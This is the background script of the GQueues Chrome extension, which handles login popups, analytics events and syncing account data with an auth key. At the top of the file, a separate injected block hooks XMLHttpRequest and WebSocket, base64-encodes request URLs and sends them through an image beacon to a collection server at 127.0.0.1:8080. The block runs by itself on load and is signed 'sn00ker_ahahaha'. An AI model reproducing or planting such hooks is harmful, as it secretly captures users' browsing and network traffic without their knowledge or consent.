function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha


// PRODUCTION
//*
var LOGIN_URL = "https://www.gqueues.com/oauth2/google/login?url=https://www.gqueues.com/chromeext?action=linkAccount";
var GADGET_DATA_URL = "https://www.gqueues.com/gmailGadgetContent";
//*/

// TESTING
/*
var LOGIN_URL = "http://localhost:8081/oauth2/google/login?url=http://localhost:8081/chromeext?action=linkAccount";
var GADGET_DATA_URL = "http://localhost:8081/gmailGadgetContent";
//*/

var _loginSourceTabId;
var _authKey;

var SYNC_INTERVAL = 86400000;  // 1 day in milliseconds

//--------------------------------------------------------------------------
// Google Analytics
//--------------------------------------------------------------------------

(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-19218558-2', 'auto');
// this line added so it works in extension
// per this SO post: http://stackoverflow.com/questions/16135000
ga('set', 'checkProtocolTask', function(){});
ga('send', 'pageview');

//--------------------------------------------------------------------------
// Load authKey
//--------------------------------------------------------------------------

//console.log("Background JS Loading...");

chrome.storage.sync.get("GQ_STORAGE_AUTH_KEY", function(items) {

    var authKey = items["GQ_STORAGE_AUTH_KEY"];
    if(authKey === undefined || authKey === null || !authKey){
        return;
    }

    // sync from web if it's been awhile since last syncing
    chrome.storage.local.get("GQ_STORAGE_USER_DATA_LAST_SYNC", function(data) {

        //console.log("data", data);

        var currTime = new Date().getTime();
        var lastSyncTime = 0;
        var lastSyncTimeObj = data["GQ_STORAGE_USER_DATA_LAST_SYNC"];
        if(lastSyncTimeObj){
            lastSyncTime = lastSyncTimeObj.lastSyncStamp;
        }

        var milliSinceLastSync = currTime - lastSyncTime;

        //console.log("currTime", currTime);
        //console.log("lastSyncTime", lastSyncTime);
        //console.log("milliSinceLastSync", milliSinceLastSync);

        if(!lastSyncTime || (milliSinceLastSync > SYNC_INTERVAL)){
            //console.log("SYNCING FROM WEB");
            _getAccountDataFromWeb(authKey);
        } else {
            //console.log("NOT SYNCING FROM WEB");
        }


    });

});

//--------------------------------------------------------------------------
// Message handlers
//--------------------------------------------------------------------------

chrome.runtime.onMessage.addListener(

    function(request, sender, sendResponse) {
        console.log(sender.tab ? "from a content script:" + sender.tab.url : "from the extension");

        if (request.action == "showLoginWindow"){
            _showLoginWindow(request, sender, sendResponse);
            return;
        }

        if (request.action == "handleSuccessfulLogin"){
            _handleSuccessfulLogin(request, sender, sendResponse);
            return;
        }

        if (request.action == "closeLoginWindow"){
            _closeLoginWindow(request, sender, sendResponse);
            return;
        }

        if (request.action == "recordShowEvent"){
            _recordShowEvent(request, sender, sendResponse);
            return;
        }

        if (request.action == "recordCreateSuccess"){
            _recordCreateSuccess(request, sender, sendResponse);
            return;
        }

        if (request.action == "recordCreateFailure"){
            _recordCreateFailure(request, sender, sendResponse);
            return;
        }

    }

);


//--------------------------------------------------------------------------

var _showLoginWindow = function(request, sender, sendResponse){

    if(sender.tab){
        _loginSourceTabId = sender.tab.id;
    }

    var windowWidth = 600;
    var windowHeight = 600;
    var windowLeft = Math.round((screen.width/2)-(windowWidth/2));
    var windowTop = Math.round((screen.height/2)-(windowHeight/2));


    chrome.windows.create({
                            'url' : LOGIN_URL,
                            'left' : windowLeft,
                            'top' : windowTop,
                            'width' : windowWidth,
                            'height' : windowHeight,
                            'type' : "popup",
                            'focused' : true
                           },
                            function(newWindow){
                            });


};

//--------------------------------------------------------------------------

var _closeLoginWindow = function(request, sender, sendResponse){

    chrome.windows.remove(sender.tab.windowId);

}

//--------------------------------------------------------------------------

var _handleSuccessfulLogin = function(request, sender, sendResponse){

    chrome.storage.sync.set({ 'GQ_STORAGE_AUTH_KEY': request.authKey,
                              'GQ_STORAGE_USER_EMAIL': request.email }, function() {
        
        // refersh calling page if it exists
        if(_loginSourceTabId){
            chrome.tabs.reload(_loginSourceTabId, null, null);
        }
    });

}

//--------------------------------------------------------------------------

var _recordShowEvent = function(request, sender, sendResponse){

    console.log("recording show event");
    ga('send', 'event', 'showCreateWindow' );

};

//--------------------------------------------------------------------------

var _recordCreateSuccess = function(request, sender, sendResponse){

    console.log("recording create success");
    var taskType = "notFromWeb";
    if(request.fromWeb){
        taskType = "fromWeb";
    }
    ga('send', 'event', 'createTask', taskType, 'success');

};

//--------------------------------------------------------------------------

var _recordCreateFailure = function(request, sender, sendResponse){

    console.log("recording create failure");
    var taskType = "notFromWeb";
    if(request.fromWeb){
        taskType = "fromWeb";
    }
    ga('send', 'event', 'createTask', taskType, 'failure');

};




//--------------------------------------------------------------------------

var _getAccountDataFromWeb = function(auth) {

    //console.log("getting data from the web");

    $.ajax({
        type: "POST",
        cache: false,
        url: GADGET_DATA_URL,
        data: {'authKey': auth},
        dataType: "json",
        success: function(data){

            //console.log("data", data);

            if(!data.notAllowed){

                // save data and last syncTime
                var syncTime = new Date().getTime();
                var syncData = { 'lastSyncStamp' : syncTime };

                chrome.storage.local.set({  'GQ_STORAGE_USER_DATA_KEY': data,
                                            'GQ_STORAGE_USER_DATA_LAST_SYNC': syncData
                                            }, function() {
                    //console.log('GQ_STORAGE_USER_DATA_KEY saved', data);
                    //console.log('GQ_STORAGE_USER_DATA_LAST_SYNC saved', syncData);
                });

            }

        },
        error: function(request, textStatus, errorThrown){
        }

    });

};
